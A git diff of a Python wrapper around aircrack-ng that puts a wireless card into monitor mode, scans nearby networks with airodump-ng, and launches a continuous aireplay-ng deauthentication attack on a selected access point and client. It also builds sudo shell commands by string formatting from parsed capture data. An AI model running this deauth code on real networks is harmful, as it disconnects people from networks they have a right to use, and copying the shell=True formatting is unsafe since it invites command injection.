@@ -1,15 +1,18 @@
+import signal
 import subprocess
 import time
 import os
 import csv
+from threading import Timer
 from Classes.airodumpNet import airodumpNet
 from Classes.airodumpNet import airodumpStation
+from Classes.selfConfig import config
 
 class aircrack:
 
     @staticmethod
 
-    def check_wlan_mode():
+    def check_wlan_mode(): # в конфиг и передалать чтоб выдавал мод из уже существующего
         cmd = os.listdir('/proc/net/dev_snmp6')
         lo = 'lo'
         eth0 = 'eth0'
@@ -25,18 +28,50 @@ class aircrack:
         return interface_mode
 
     def monitor_mode():
-        cmd = 'sudo airmon-ng start wlan0'
+        cmd = ('sudo airmon-ng start %s' % config.get_actual_interface())
+        print(cmd)
         subprocess.call(cmd, shell=True)
 
     def managed_mode():
-        cmd = 'sudo airmon-ng stop wlan0mon'
+        cmd = ('sudo airmon-ng stop %s' % config.get_actual_interface())
+        print(cmd)
         subprocess.call(cmd, shell=True)
 
     def airodump_call():
-        cmd = 'sudo airodump-ng --write a/txt01 wlan0mon'
-        result = subprocess.Popen(cmd,shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
-        time.sleep(20)
-        result.kill()
+        cmd = ('sudo airodump-ng --write /home/bobax/PycharmProjects/Bas/a/txt01 %s' % config.get_actual_interface())
+        print(cmd)
+        #result = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
+        #result.communicate()
+        #result = subprocess.call(cmd.split(),shell=True, timeout=10)
+        #time.sleep(5)
+        #timer = Timer(10, aircrack.terminate, args=[result])
+        #timer.start()
+
+        #print(result.pid)
+        #print('QQQ')
+
+        pro = subprocess.Popen(cmd, stdout=subprocess.PIPE,
+                               shell=True, preexec_fn=os.setsid)
+        time.sleep(10)
+        os.killpg(os.getpgid(pro.pid), signal.SIGTERM)
+
+        #result.wait()
+        #timer.cancel()
+        #print("QQQ")
+        #os.system("sudo kill %s" % result.pid)
+        #result.terminate()
+        #result.kill()
+
+        #print(result.pid,"PID")
+        #pgid = os.getpgid(result.pid)
+        #subprocess.check_output("sudo kill {}.".format(pgid), shell=True)
+
+    def terminate(process):
+        if process.poll() is None:
+            print('AAA')
+            #subprocess.call('taskkill /F /T /PID ' + str(process.pid))
+            process.terminate()
+            process.kill()
 
     def sort_by_power(arr):
        return arr[8]
@@ -45,7 +80,7 @@ class aircrack:
         return arr[10]
 
     def open_csv_file():
-        filename = 'a/txt01-01.csv'
+        filename = '/home/bobax/PycharmProjects/Bas/a/txt01-01.csv'
         with open(filename, 'r', newline = '') as file:
             file_reader = csv.reader(file)
             format_file = [row for row in file_reader]
@@ -114,7 +149,7 @@ class aircrack:
         result_array = []
         for station in station_array:
             print("a",station.BSSID)
-            print("a",network.BSSID)
+            print("b",network.BSSID)
             if station.BSSID == network.BSSID:
                 result_array.append(station)
         print("RESULT", result_array)
@@ -134,17 +169,17 @@ class aircrack:
 class aireplay:
 
     def deauth_attack(self, net: airodumpNet, station: airodumpStation):
-        cmd = ('sudo aireplay-ng -0 0 -a %s -c %s wlan0mon' %  (net.BSSID, station.MAC))
-        print(cmd)
         self.change_channel(net)
+        cmd = ('sudo aireplay-ng -0 0 -a %s -c %s %s' %  (net.BSSID, station.MAC, config.get_actual_interface()))
+        print(cmd)
         result = subprocess.Popen(cmd,shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
-        #out, err = result.communicate()
-        #print(out)
-        time.sleep(15)
+        out, err = result.communicate()
+        time.sleep(20)
         result.kill()
 
     def change_channel(self, net: airodumpNet):
-        cmd = ('sudo iwconfig wlan0mon channel %s' % net.channel)
+        cmd = ('sudo iwconfig %s channel %s' % (config.get_actual_interface(), net.channel))
+        print(cmd)
         subprocess.call(cmd, shell=True)
 
 
